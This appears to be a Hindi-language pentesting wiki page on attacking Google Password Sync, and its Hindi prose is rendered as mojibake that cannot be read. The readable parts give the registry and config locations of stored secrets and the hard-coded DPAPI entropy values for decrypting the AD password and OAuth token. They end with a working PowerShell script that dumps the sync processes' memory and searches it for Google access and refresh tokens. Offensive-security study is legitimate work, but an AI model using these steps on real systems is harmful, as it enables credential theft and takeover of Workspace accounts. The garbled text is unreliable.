## GPS - Google ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∏‡§ø‡§Ç‡§ï

‡§Ø‡§π ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä ‡§î‡§∞ ‡§∏‡•á‡§µ‡§æ ‡§π‡•à ‡§ú‡•ã Google ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•á ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§ï‡•ã **AD** ‡§î‡§∞ Workspace ‡§ï‡•á ‡§¨‡•Ä‡§ö ‡§∏‡§Æ‡§®‡•ç‡§µ‡§Ø‡§ø‡§§ ‡§∞‡§ñ‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡•ç‡§∞‡§¶‡§æ‡§® ‡§ï‡§∞‡§§‡§æ ‡§π‡•à‡•§ ‡§ú‡§¨ ‡§≠‡•Ä ‡§è‡§ï ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ AD ‡§Æ‡•á‡§Ç ‡§Ö‡§™‡§®‡§æ ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§¨‡§¶‡§≤‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§á‡§∏‡•á Google ‡§™‡§∞ ‡§∏‡•á‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à‡•§

‡§Ø‡§π `C:\Program Files\Google\Password Sync` ‡§Æ‡•á‡§Ç ‡§∏‡•ç‡§•‡§æ‡§™‡§ø‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§ú‡§π‡§æ‡§Ç ‡§Ü‡§™ ‡§á‡§∏‡•á ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä `PasswordSync.exe` ‡§î‡§∞ `password_sync_service.exe` (‡§∏‡•á‡§µ‡§æ ‡§ú‡•ã ‡§ö‡§≤‡§§‡•Ä ‡§∞‡§π‡•á‡§ó‡•Ä) ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

### GPS - ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§®

‡§á‡§∏ ‡§¨‡§æ‡§á‡§®‡§∞‡•Ä (‡§î‡§∞ ‡§∏‡•á‡§µ‡§æ) ‡§ï‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§á‡§∏‡•á **Workspace ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§∏‡•Å‡§™‡§∞ ‡§è‡§°‡§Æ‡§ø‡§® ‡§™‡•ç‡§∞‡§ø‡§Ç‡§∏‡§ø‡§™‡§≤ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö ‡§¶‡•á‡§®‡§æ ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§π‡•à**:

* Google ‡§ï‡•á ‡§∏‡§æ‡§• **OAuth** ‡§ï‡•á ‡§Æ‡§æ‡§ß‡•ç‡§Ø‡§Æ ‡§∏‡•á ‡§≤‡•â‡§ó‡§ø‡§® ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§Ø‡§π **‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§Æ‡•á‡§Ç (‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§°) ‡§è‡§ï ‡§ü‡•ã‡§ï‡§® ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§∞‡•á‡§ó‡§æ**
* GUI ‡§ï‡•á ‡§∏‡§æ‡§• ‡§°‡•ã‡§Æ‡•á‡§® ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ï‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§π‡•Ä ‡§â‡§™‡§≤‡§¨‡•ç‡§ß
* **Workspace ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡§æ ‡§™‡•ç‡§∞‡§¨‡§Ç‡§ß‡§® ‡§ï‡§∞‡§®‡•á** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø‡§Ø‡•ã‡§Ç ‡§ï‡•á ‡§∏‡§æ‡§• **GCP ‡§∏‡•á ‡§ï‡•Å‡§õ ‡§∏‡•á‡§µ‡§æ ‡§ñ‡§æ‡§§‡§æ ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏** (json ‡§´‡§º‡§æ‡§á‡§≤) ‡§¶‡•á‡§®‡§æ
* ‡§¨‡§π‡•Å‡§§ ‡§¨‡•Å‡§∞‡§æ ‡§µ‡§ø‡§ö‡§æ‡§∞ ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø ‡§Ø‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤ ‡§ï‡§≠‡•Ä ‡§∏‡§Æ‡§æ‡§™‡•ç‡§§ ‡§®‡§π‡•Ä‡§Ç ‡§π‡•ã‡§§‡•á ‡§î‡§∞ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§è ‡§ú‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç
* Workspace ‡§™‡§∞ SA ‡§ï‡•ã ‡§™‡§π‡•Å‡§Ç‡§ö ‡§¶‡•á‡§®‡§æ ‡§¨‡§π‡•Å‡§§ ‡§¨‡•Å‡§∞‡§æ ‡§µ‡§ø‡§ö‡§æ‡§∞ ‡§π‡•à ‡§ï‡•ç‡§Ø‡•ã‡§Ç‡§ï‡§ø SA ‡§ï‡•ã GCP ‡§Æ‡•á‡§Ç ‡§∏‡§Æ‡§ù‡•å‡§§‡§æ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à ‡§î‡§∞ Workspace ‡§™‡§∞ ‡§™‡§ø‡§µ‡§ü ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•ã‡§ó‡§æ
* Google ‡§á‡§∏‡•á GUI ‡§ï‡•á ‡§¨‡§ø‡§®‡§æ ‡§°‡•ã‡§Æ‡•á‡§® ‡§®‡§ø‡§Ø‡§Ç‡§§‡•ç‡§∞‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï ‡§ï‡§∞‡§§‡§æ ‡§π‡•à
* ‡§Ø‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•ç‡§∏ ‡§≠‡•Ä ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç

AD ‡§ï‡•á ‡§∏‡§Ç‡§¨‡§Ç‡§ß ‡§Æ‡•á‡§Ç, ‡§á‡§∏‡•á ‡§µ‡§∞‡•ç‡§§‡§Æ‡§æ‡§® **‡§ê‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠, ‡§ó‡•Å‡§Æ‡§®‡§æ‡§Æ ‡§Ø‡§æ ‡§ï‡•Å‡§õ ‡§µ‡§ø‡§∂‡§ø‡§∑‡•ç‡§ü ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§á‡§Ç‡§ó‡§ø‡§§ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à‡•§ ‡§Ø‡§¶‡§ø ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§µ‡§ø‡§ï‡§≤‡•ç‡§™ ‡§ö‡•Å‡§®‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à, ‡§§‡•ã **‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§®‡§æ‡§Æ** ‡§ï‡•ã **‡§°‡§ø‡§∏‡•ç‡§ï** ‡§Æ‡•á‡§Ç ‡§è‡§ï ‡§´‡§º‡§æ‡§á‡§≤ ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** **‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§°** ‡§π‡•ã‡§§‡§æ ‡§π‡•à ‡§î‡§∞ **‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä** ‡§Æ‡•á‡§Ç ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•ã‡§§‡§æ ‡§π‡•à‡•§

### GPS - ‡§°‡§ø‡§∏‡•ç‡§ï ‡§∏‡•á ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§î‡§∞ ‡§ü‡•ã‡§ï‡§® ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ

{% hint style="success" %}
‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) **GPS** ‡§ï‡§æ ‡§™‡§§‡§æ ‡§≤‡§ó‡§æ‡§®‡•á, ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞‡•á‡§∂‡§® ‡§ï‡•á ‡§¨‡§æ‡§∞‡•á ‡§Æ‡•á‡§Ç ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡§®‡•á ‡§î‡§∞ **‡§Ø‡§π‡§æ‡§Ç ‡§§‡§ï ‡§ï‡§ø ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§î‡§∞ ‡§ü‡•ã‡§ï‡§® ‡§ï‡•ã ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á** ‡§Æ‡•á‡§Ç ‡§∏‡§ï‡•ç‡§∑‡§Æ ‡§π‡•à‡•§
{% endhint %}

‡§´‡§º‡§æ‡§á‡§≤ **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** ‡§Æ‡•á‡§Ç AD ‡§ï‡•á ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§è ‡§ó‡§è **`baseDN`** ‡§î‡§∞ ‡§ú‡§ø‡§®‡§ï‡•á ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ ‡§∞‡§π‡§æ ‡§π‡•à ‡§â‡§®‡§ï‡•á **`username`** ‡§ï‡§æ ‡§è‡§ï ‡§≠‡§æ‡§ó ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§

‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä **`HKLM\Software\Google\Google Apps Password Sync`** ‡§Æ‡•á‡§Ç **‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§∞‡•Ä‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§®** ‡§î‡§∞ AD ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§ï‡•á ‡§≤‡§ø‡§è **‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** (‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§π‡•ã) ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§Ø‡§¶‡§ø ‡§ü‡•ã‡§ï‡§® ‡§ï‡•á ‡§¨‡§ú‡§æ‡§Ø ‡§ï‡•Å‡§õ **SA ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à, ‡§§‡•ã ‡§â‡§®‡•ç‡§π‡•á‡§Ç ‡§≠‡•Ä ‡§â‡§∏ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§™‡§§‡•á ‡§Æ‡•á‡§Ç ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§™‡§æ‡§Ø‡§æ ‡§ú‡§æ ‡§∏‡§ï‡§§‡§æ ‡§π‡•à‡•§ ‡§á‡§∏ ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ **‡§Æ‡§æ‡§®** ‡§ï‡•á‡§µ‡§≤ **‡§µ‡•ç‡§Ø‡§µ‡§∏‡•ç‡§•‡§æ‡§™‡§ï‡•ã‡§Ç** ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ **‡§™‡§π‡•Å‡§Å‡§ö ‡§Ø‡•ã‡§ó‡•ç‡§Ø** ‡§π‡•ã‡§§‡•á ‡§π‡•à‡§Ç‡•§

‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° **‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§°** (‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§π‡•ã) ‡§ï‡•Å‡§Ç‡§ú‡•Ä **`ADPassword`** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡•á **`CryptProtectData`** API ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡•á ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™‡§ï‡•ã ‡§â‡§∏‡•Ä ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§ú‡§ø‡§∏‡§®‡•á ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∏‡§ø‡§Ç‡§ï ‡§ï‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§•‡§æ ‡§î‡§∞ ‡§á‡§∏ **‡§è‡§Ç‡§ü‡•ç‡§∞‡•â‡§™‡•Ä** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ú‡§¨ ‡§Ü‡§™ **`CryptUnprotectData`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•ã‡§Ç: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§° ‡§ü‡•ã‡§ï‡§® (‡§Ø‡§¶‡§ø ‡§ï‡•ã‡§à ‡§π‡•ã) ‡§ï‡•Å‡§Ç‡§ú‡•Ä **`AuthToken`** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§π‡•à ‡§î‡§∞ ‡§á‡§∏‡•á **`CryptProtectData`** API ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§è‡§®‡•ç‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§ ‡§á‡§∏‡•á ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è, ‡§Ü‡§™‡§ï‡•ã ‡§â‡§∏‡•Ä ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§π‡•ã‡§®‡§æ ‡§ö‡§æ‡§π‡§ø‡§è ‡§ú‡§ø‡§∏‡§®‡•á ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∏‡§ø‡§Ç‡§ï ‡§ï‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§•‡§æ ‡§î‡§∞ ‡§á‡§∏ **‡§è‡§Ç‡§ü‡•ç‡§∞‡•â‡§™‡•Ä** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡§æ ‡§π‡•ã‡§ó‡§æ ‡§ú‡§¨ ‡§Ü‡§™ **`CryptUnprotectData`** ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•ã‡§Ç: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
‡§á‡§∏‡§ï‡•á ‡§Ö‡§≤‡§æ‡§µ‡§æ, ‡§á‡§∏‡•á **`0123456789abcdefghijklmnopqrstv`** ‡§∂‡§¨‡•ç‡§¶‡§ï‡•ã‡§∂ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§¨‡•á‡§∏32‡§π‡•à‡§ï‡•ç‡§∏ ‡§Æ‡•á‡§Ç ‡§≠‡•Ä ‡§è‡§®‡•ç‡§ï‡•ã‡§° ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§π‡•à‡•§

‡§è‡§Ç‡§ü‡•ç‡§∞‡•â‡§™‡•Ä ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§â‡§™‡§ï‡§∞‡§£ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§ï‡•á ‡§™‡§æ‡§Ø‡§æ ‡§ó‡§Ø‡§æ‡•§ ‡§á‡§∏‡•á **`CryptUnprotectData`** ‡§î‡§∞ **`CryptProtectData`** ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•â‡§≤ ‡§ï‡•Ä ‡§®‡§ø‡§ó‡§∞‡§æ‡§®‡•Ä ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ ‡§î‡§∞ ‡§´‡§ø‡§∞ ‡§á‡§∏ ‡§â‡§™‡§ï‡§∞‡§£ ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó `PasswordSync.exe` ‡§ï‡•ã ‡§≤‡•â‡§®‡•ç‡§ö ‡§î‡§∞ ‡§Æ‡•â‡§®‡§ø‡§ü‡§∞ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ ‡§ú‡•ã ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§î‡§∞ ‡§ë‡§• ‡§ü‡•ã‡§ï‡§® ‡§ï‡•ã ‡§∂‡•Å‡§∞‡•Ç ‡§Æ‡•á‡§Ç ‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü ‡§ï‡§∞‡•á‡§ó‡§æ ‡§î‡§∞ ‡§â‡§™‡§ï‡§∞‡§£ **‡§¶‡•ã‡§®‡•ã‡§Ç ‡§Æ‡§æ‡§Æ‡§≤‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡•Ä ‡§ó‡§à ‡§è‡§Ç‡§ü‡•ç‡§∞‡•â‡§™‡•Ä ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Æ‡§æ‡§® ‡§¶‡§ø‡§ñ‡§æ‡§è‡§ó‡§æ**:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

‡§ß‡•ç‡§Ø‡§æ‡§® ‡§¶‡•á‡§Ç ‡§ï‡§ø ‡§á‡§® APIs ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡•â‡§≤ ‡§ï‡•á ‡§á‡§®‡§™‡•Å‡§ü ‡§Ø‡§æ ‡§Ü‡§â‡§ü‡§™‡•Å‡§ü ‡§Æ‡•á‡§Ç **‡§°‡§ø‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§ü‡•á‡§°** ‡§Æ‡§æ‡§®‡•ã‡§Ç ‡§ï‡•ã ‡§≠‡•Ä ‡§¶‡•á‡§ñ‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à (‡§Ø‡§¶‡§ø ‡§ï‡§ø‡§∏‡•Ä ‡§¨‡§ø‡§Ç‡§¶‡•Å ‡§™‡§∞ Winpeas ‡§ï‡§æ‡§Æ ‡§ï‡§∞‡§®‡§æ ‡§¨‡§Ç‡§¶ ‡§ï‡§∞ ‡§¶‡•á)‡•§

‡§Ø‡§¶‡§ø ‡§™‡§æ‡§∏‡§µ‡§∞‡•ç‡§° ‡§∏‡§ø‡§Ç‡§ï **SA ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•á ‡§∏‡§æ‡§• ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§Ø‡§æ ‡§ó‡§Ø‡§æ ‡§•‡§æ**, ‡§§‡•ã ‡§Ø‡§π ‡§∞‡§ú‡§ø‡§∏‡•ç‡§ü‡•ç‡§∞‡•Ä **`HKLM\Software\Google\Google Apps Password Sync`** ‡§ï‡•á ‡§Ö‡§Ç‡§¶‡§∞ ‡§ï‡•Å‡§Ç‡§ú‡§ø‡§Ø‡•ã‡§Ç ‡§Æ‡•á‡§Ç ‡§≠‡•Ä ‡§∏‡§Ç‡§ó‡•ç‡§∞‡§π‡•Ä‡§§ ‡§π‡•ã‡§ó‡§æ‡•§

### GPS - ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§∏‡•á ‡§ü‡•ã‡§ï‡§® ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ

GCPW ‡§ï‡•Ä ‡§§‡§∞‡§π, `PasswordSync.exe` ‡§î‡§∞ `password_sync_service.exe` ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§ì‡§Ç ‡§ï‡•Ä ‡§Æ‡•á‡§Æ‡•ã‡§∞‡•Ä ‡§ï‡•ã ‡§°‡§Ç‡§™ ‡§ï‡§∞‡§®‡§æ ‡§∏‡§Ç‡§≠‡§µ ‡§π‡•à ‡§î‡§∞ ‡§Ü‡§™ ‡§∞‡•Ä‡§´‡•ç‡§∞‡•á‡§∂ ‡§î‡§∞ ‡§è‡§ï‡•ç‡§∏‡•á‡§∏ ‡§ü‡•ã‡§ï‡§® (‡§Ø‡§¶‡§ø ‡§™‡§π‡§≤‡•á ‡§∏‡•á ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§π‡•ã ‡§ö‡•Å‡§ï‡•á ‡§π‡•à‡§Ç) ‡§™‡§æ ‡§∏‡§ï‡•á‡§Ç‡§ó‡•á‡•§\
‡§Æ‡•Å‡§ù‡•á ‡§≤‡§ó‡§§‡§æ ‡§π‡•à ‡§ï‡§ø ‡§Ü‡§™ AD ‡§ï‡•â‡§®‡•ç‡§´‡§º‡§ø‡§ó‡§∞ ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ï‡•ç‡§∞‡•á‡§°‡•á‡§Ç‡§∂‡§ø‡§Ø‡§≤‡•ç‡§∏ ‡§ï‡•ã ‡§≠‡•Ä ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§

<details>

<summary>‡§°‡§Ç‡§™ <code>PasswordSync.exe</code> ‡§î‡§∞ <code>password_sync_service.exe</code> ‡§™‡•ç‡§∞‡§ï‡•ç‡§∞‡§ø‡§Ø‡§æ‡§è‡§Å ‡§î‡§∞ ‡§ü‡•ã‡§ï‡§® ‡§ñ‡•ã‡§ú‡•á‡§Ç</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

